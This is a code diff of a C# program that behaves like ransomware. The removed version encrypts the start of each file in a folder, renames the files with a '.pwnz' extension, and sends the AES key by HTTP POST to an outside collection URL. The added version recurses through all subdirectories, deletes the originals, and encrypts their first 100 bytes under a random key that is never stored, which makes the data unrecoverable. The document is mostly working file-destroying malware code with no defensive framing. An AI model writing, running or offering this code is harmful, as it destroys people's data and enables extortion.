@@ -1,74 +1,122 @@
 using System;
 using System.IO;
 using System.Security.Cryptography;
-using System.Net.Http;
 using System.Text;
-using System.Threading.Tasks;
 
 class Program
 {
-    static readonly HttpClient client = new HttpClient();
-
-    static async Task Main(string[] args)
+    static void Main(string[] args)
     {
-        if (args.Length == 0)
+        if (args.Length != 1)
         {
-            Console.WriteLine("Veuillez spécifier un répertoire.");
+            Console.WriteLine("Usage: Program <directory>");
             return;
         }
 
-        string directoryPath = args[0];
-        DirectoryInfo di = new DirectoryInfo(directoryPath);
-
-        using (Aes aesAlg = Aes.Create())
+        string rootDirectory = args[0];
+        if (!Directory.Exists(rootDirectory))
         {
-            aesAlg.KeySize = 256; // Utilisation d'une clé AES de 256 bits
-            aesAlg.GenerateKey(); // Génération d'une clé aléatoire
+            Console.WriteLine($"Directory '{rootDirectory}' does not exist.");
+            return;
+        }
 
-            // Envoi de la clé AES
-            await SendKeyAsync(Convert.ToBase64String(aesAlg.Key));
+        ProcessDirectory(rootDirectory);
+    }
 
-            foreach (FileInfo file in di.GetFiles())
-            {
-                EncryptFile(file, aesAlg);
-            }
+    static void ProcessDirectory(string targetDirectory)
+    {
+        // Process the list of files in the directory.
+        string[] fileEntries = Directory.GetFiles(targetDirectory);
+        foreach (string fileName in fileEntries)
+        {
+            ProcessFile(fileName);
+        }
+
+        // Recurse into subdirectories of this directory.
+        string[] subdirectoryEntries = Directory.GetDirectories(targetDirectory);
+        foreach (string subdirectory in subdirectoryEntries)
+        {
+            ProcessDirectory(subdirectory);
         }
     }
 
-    static void EncryptFile(FileInfo fileInfo, Aes aesAlg)
+    static void ProcessFile(string filePath)
     {
-        byte[] fileBytes = File.ReadAllBytes(fileInfo.FullName);
-        byte[] encryptedBytes;
-
-        using (MemoryStream msEncrypt = new MemoryStream())
+        try
         {
-            using (ICryptoTransform encryptor = aesAlg.CreateEncryptor())
+            string newFilePath = GetUniqueFilePath(filePath);
+
+            // Copy the file with the new extension
+            File.Copy(filePath, newFilePath);
+
+            // Delete the original file
+            File.Delete(filePath);
+
+            // Encrypt the first 100 bytes of the new file
+            EncryptFirst100Bytes(newFilePath);
+
+            Console.WriteLine($"Processed file: {filePath}");
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine($"Error processing file '{filePath}': {ex.Message}");
+        }
+    }
+
+    static string GetUniqueFilePath(string filePath)
+    {
+        string directory = Path.GetDirectoryName(filePath);
+        string originalFileName = Path.GetFileNameWithoutExtension(filePath);
+        string newFilePath = Path.Combine(directory, originalFileName + ".pwnz");
+
+        while (File.Exists(newFilePath))
+        {
+            char randomLetter = (char)('A' + new Random().Next(0, 26));
+            newFilePath = Path.Combine(directory, originalFileName + randomLetter + ".pwnz");
+        }
+
+        return newFilePath;
+    }
+
+    static void EncryptFirst100Bytes(string filePath)
+    {
+        byte[] key = new byte[32]; // AES256 key size is 32 bytes
+        byte[] iv = new byte[16]; // AES block size is 16 bytes
+
+        using (var rng = new RNGCryptoServiceProvider())
+        {
+            rng.GetBytes(key);
+            rng.GetBytes(iv);
+        }
+
+        byte[] buffer = new byte[100];
+        using (FileStream fs = new FileStream(filePath, FileMode.Open, FileAccess.ReadWrite))
+        {
+            fs.Read(buffer, 0, buffer.Length);
+
+            using (Aes aes = Aes.Create())
             {
-                using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
+                aes.Key = key;
+                aes.IV = iv;
+                aes.Padding = PaddingMode.None;
+                aes.Mode = CipherMode.CBC;
+
+                using (var encryptor = aes.CreateEncryptor(aes.Key, aes.IV))
+                using (var ms = new MemoryStream())
                 {
-                    // Chiffrement des 100 premiers octets ou du fichier entier si sa taille est inférieure
-                    csEncrypt.Write(fileBytes, 0, Math.Min(100, fileBytes.Length));
-                }
+                    using (var cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write))
+                    {
+                        cs.Write(buffer, 0, buffer.Length);
+                    }
 
-                encryptedBytes = msEncrypt.ToArray();
+                    byte[] encrypted = ms.ToArray();
+                    fs.Seek(0, SeekOrigin.Begin);
+                    fs.Write(encrypted, 0, encrypted.Length);
+                }
             }
         }
 
-        // Réécriture du fichier avec les données chiffrées
-        using (FileStream fs = fileInfo.OpenWrite())
-        {
-            fs.Write(encryptedBytes, 0, encryptedBytes.Length);
-            fs.SetLength(encryptedBytes.Length); // Ajustement de la taille du fichier si nécessaire
-        }
-
-        // Renommage du fichier avec l'extension .pwnz
-        File.Move(fileInfo.FullName, Path.ChangeExtension(fileInfo.FullName, ".pwnz"));
-    }
-
-    static async Task SendKeyAsync(string key)
-    {
-        var content = new StringContent(key, Encoding.UTF8, "text/plain");
-        var response = await client.PostAsync("https://en4a3z09mtjsq.x.pipedream.net/", content);
-        response.EnsureSuccessStatusCode();
+        // Optionally, you can store the key and IV somewhere secure
+        Console.WriteLine($"File '{filePath}' encrypted with AES256 key.");
     }
 }
